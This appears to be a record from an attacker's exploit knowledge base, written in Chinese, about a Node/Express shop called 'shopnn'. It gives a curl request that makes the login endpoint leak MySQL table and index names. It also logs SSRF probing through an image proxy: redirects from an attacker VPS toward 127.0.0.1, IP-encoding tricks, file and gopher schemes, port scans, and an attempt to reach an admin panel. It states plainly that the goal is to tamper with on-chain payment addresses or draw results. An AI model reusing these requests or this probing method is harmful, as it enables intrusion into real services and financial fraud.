# shopnn (example.com) 可利用性判死集：mock 登录回显 MySQL 错误（=信息泄露）；img-proxy SSRF 无内网/写面绕过

- **code**: shopnn-adyyyk-mock-login-mysql-error-leak-and-escalation-neg
- **kind**: poc
- **category**: info-leak
- **component**: shopnn (Node/Express + Vue3 电商)
- **severity**: medium
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-16 在 example.com（203.0.113.50，Host shopnn）实测。信息泄露：POST /api/pub/auth/login/phone-mock body {"phone":"8613800138001","device_fingerprint":"00...(64)"} => 200 {"code":500,"message":"Duplicate entry '...' for key 'c_user_phone_mock.uk_phone_mock_phone"}。SSRF 本轮决定性复核：VPS 203.0.113.77:8090 探针日志 (a) url=.../redir?to=http://203.0.113.77:8090/png => 200 image/png；(b) 同 redir 落点改 http://127.0.0.1:80/ => 403 blocked_url；(c) VPS 仅收到 accept-encoding/user-agent/referer/Host/Connection；(d) 203.0.113.50:80 => 415 not_image、:8080 => 403 blocked_url，对照 203.0.113.1:8080 => 415；(e) target450.example.com/admin/api.php 经 SSRF => 502 upstream_403，直连 => 403 {"ok":false,"error":"该 IP 不允许访问后台"}；(f) POST img-proxy => 405。原始请求 traffic 1792144019/021/024/053/055/1000/1007。记录 fact 3915、3916（confirmed），finding 3907 报告已更新。
- **tags**: info-leak,mysql-error,express,mock-login,ssrf,blocked_url,redirect,self-port-guard,shopnn,adyyyk,campay,negative
- **created_at**: 2026-10-16T09:34:12.221Z
- **found_by**: exploit

## 描述

shopnn 两点均无法升级为写面/RCE：(1) 公开 mock 登录回显原始 MySQL 错误（库表/唯一索引名）——纯信息泄露；(2) /api/pub/img-proxy 是真实 SSRF（出口=自身公网 IP 203.0.113.50），但 GET-only、重定向目标二次过私网黑名单、固定请求头不转发、对自身 IP 非 80/443 端口做应用层拦截，且目标1 落点 target450.example.com 后台对本机自 IP 也 IP 白名单拒绝。供复用者直接判死，别手搓。

## 用法

```
判据：命中 X-Powered-By: Express + /api/health 返回 {"ok":true,"service":"shopnn-server"} 即该应用。
【信息泄露】curl -sk -X POST 'https://example.com/api/pub/auth/login/phone-mock' -H 'Content-Type: application/json' --data '{"phone":"<已登记手机号>","device_fingerprint":"<64hex>"}' → 200 {"code":500,"message":"Duplicate entry '...' for key 'c_user_phone_mock.uk_phone_mock_phone'"}
【img-proxy SSRF（真出网但无用）】GET /api/pub/img-proxy?url=<任意URL>，出口 IP=203.0.113.50（与 target450.example.com 同机）。已实测证否的升级方向（均别再试）：
 ① 302 绕私网：跟随重定向但落点二次过黑名单 —— url=http://<vps>/redir?to=http://127.0.0.1:80/ → 403 blocked_url；解析到 127 的域名(target451.example.com/target452.example.com/127.0.0.1.sslip.io)亦 403。
 ② 伪造来源 IP：只发 accept-encoding/user-agent/referer/Host/Connection 五头，XFF/X-Real-IP/自定义头全不转发。
 ③ 打本机端口：203.0.113.50 仅 80/443 放行(415 not_image)，8080/3306/6379/9000/8081/8443/.../8090 一律 403 blocked_url（应用层自机端口守卫；对照 203.0.113.1:8080 → 415 可达，非全局端口过滤）；且 image 嗅探使 415 无法判端口开放。
 ④ 十进制/十六进制/八进制/尾点/IPv6-mapped 变体、file://gopher/dict 全部 403/400。
 ⑤ 写动作：POST/PUT 一律 405 method_not_allowed（GET-only）。
 ⑥ 触达目标1落点 target450.example.com：/admin/api.php → 502 upstream_403（=campay 自身 403「该 IP 不允许访问后台」，连其同机自 IP 也拒）；/agent|/merchant/api.php → 401；后台路径变形 //、/./ 无绕过。
结论：与"改链上收款地址/开奖结果"无任何落点，勿当入口。
```
